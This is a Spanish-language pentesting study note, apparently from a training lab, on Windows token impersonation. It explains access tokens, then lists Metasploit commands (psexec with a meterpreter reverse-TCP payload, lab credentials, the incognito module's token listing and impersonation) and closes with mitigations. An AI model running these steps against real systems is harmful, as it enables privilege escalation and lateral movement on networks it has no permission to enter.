# 🧠 ¿Qué es el **Token Impersonation**?

Cuando accedes a un sistema, Windows genera un **token de acceso** para ti:

- Es como un **"pase temporal"** que dice quién eres y qué permisos tienes.
    
- Evita que tengas que volver a meter usuario/contraseña cada vez.
    
- Puedes pensarlo como una **cookie**, pero para autenticaciones de sistemas.
    

---

# 🎯 ¿Por qué importa en pentesting?

Si un atacante consigue **capturar o duplicar** un token válido de un usuario privilegiado (como un administrador), puede:

- **Hacerse pasar por ese usuario** (impersonation).
    
- **Realizar acciones como si fuera él** (copiar archivos, ejecutar comandos, moverse lateralmente).
    
- **Escalar privilegios** dentro del sistema o red.
    

---

# 🔥 Tipos de Tokens (en pentesting)

|Tipo|Descripción|
|---|---|
|**Delegate**|Token creado al **loguearse en la máquina** o usar **Escritorio Remoto (RDP)**. Permite autenticaciones completas.|
|**Impersonate**|Token de **sesiones no interactivas** (por ejemplo, cuando alguien monta una unidad de red o un script de inicio de sesión). Permite imitar acciones pero más limitadas.|

---

# 📌 Resumen sencillo

- **Tokens = pases de identidad temporales** en Windows.
    
- **Impersonation** = usar el pase de otro usuario para actuar como él.
    
- Es una **técnica muy usada** en ataques internos para **robar privilegios** sin necesidad de crackear contraseñas.



## ¿Cómo se hace?


```
msfconsole 
```


```bash
use exploit/windows/smb/psexec
```

```bash
set payload windows/x64/meterpreter/reverse_tc
```

```bash
set rhosts 192.168.0.231
```

```bash
set smbuser fcastle
```

```bash
set smbpass Mypassword1234!
```

```bash
set smbdomain MARVEL.local
```

```bash
run
```

El ***meterpreter*** de msfconsole tiene varios modulos, para verlos y cargarlos:


VERLOS:

```
load (y le damos tab para que nos salgan las opciones)
```

EJECUTARLOS:

```
load incognito (nombre del modulo)
```

Entonces para el impersonation ejecutaremos incognito

```bash
list_tokens -u
```

```bash
impersonate_token marvel\\fcastle
```


Para volver a nt-authority/system:

```shell
rev2self
```



# 🛡️ Mitigación del ataque de **Token Impersonation**

---

## 📚 Estrategias de mitigación:

### 1. **Limitar permisos de creación y uso de tokens**

- **Controlar qué usuarios y grupos** pueden crear o usar tokens de otros.
    
- Solo los procesos de confianza deberían poder generar o duplicar tokens de acceso.
    
- **Reducir el riesgo** de que usuarios maliciosos capturen o usen tokens privilegiados.
    

---

### 2. **Account Tiering (Segmentación de cuentas)**

- **Separar** cuentas de usuario normales de las cuentas administrativas.
    
- Los administradores solo deben usar cuentas elevadas en **servidores** y **equipos seguros**, nunca en estaciones de trabajo comunes.
    
- Así, aunque se capture un token en una máquina, **no tendrá privilegios altos**.
    

---

### 3. **Restricción de administradores locales**

- **Minimizar quién tiene privilegios locales** en cada máquina.
    
- Si todos son administradores locales, cualquier compromiso puede escalar fácilmente.
    
- Solo usuarios que realmente lo necesiten deben tener esos derechos.
    

---

# 🎯 Resumen práctico

|Mitigación|Impacto|
|---|---|
|Limitar creación de tokens|Menos riesgo de captura y uso malicioso|
|Segmentar cuentas (tiering)|Protege admins de ser robados en estaciones vulnerables|
|Restringir administradores locales|Dificulta movimientos laterales y escaladas de privilegios|